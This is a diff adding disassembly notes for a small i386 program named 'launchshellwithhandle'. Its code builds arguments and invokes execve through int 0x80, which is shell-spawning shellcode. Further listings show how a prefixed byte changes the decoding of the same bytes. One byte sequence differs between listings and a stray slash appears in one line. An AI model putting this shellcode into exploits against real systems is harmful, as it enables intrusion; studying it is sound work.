@@ -1,0 +1,30 @@
+
+launchshellwithhandle:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048080 <_start>:
+ 8048080:	8d 35 a0 90 04 08    	lea    0x80490a0,%esi
+ 8048086:	83 c6 01             	add    $0x1,%esi
+ 8048089:	31 c0                	xor    %eax,%eax
+ 804808b:	89 76 08             	mov    %esi,0x8(%esi)
+ 804808e:	89 46 0c             	mov    %eax,0xc(%esi)
+ 8048091:	b8 0b /00 00 00       	mov    $0xb,%eax
+ 8048096:	8d 1e                	lea    (%esi),%ebx
+ 8048098:	8d 4e 08             	lea    0x8(%esi),%ecx
+ 804809b:	8d 56 0c             	lea    0xc(%esi),%edx
+ 804809e:	cd 80                	int    $0x80
+
+
+31 c0 83 c6 01 89 79 08 89 46 0c 90:
+0000000000000000 31c0             xor eax, eax            
+0000000000000002 83c601           add esi, 0x1            
+0000000000000005 897908           mov [ecx+0x8], edi      
+0000000000000008 89460c           mov [esi+0xc], eax      
+000000000000000b 90               nop
+
+05 31 c0 83 c6 01 89 79 08 89 46 0c 90
+0000000000000000 0531c083c6       add eax, 0xc683c031     
+0000000000000005 018979088946     add [ecx+0x46890879], ecx
+000000000000000b 0c90             or al, 0x90   
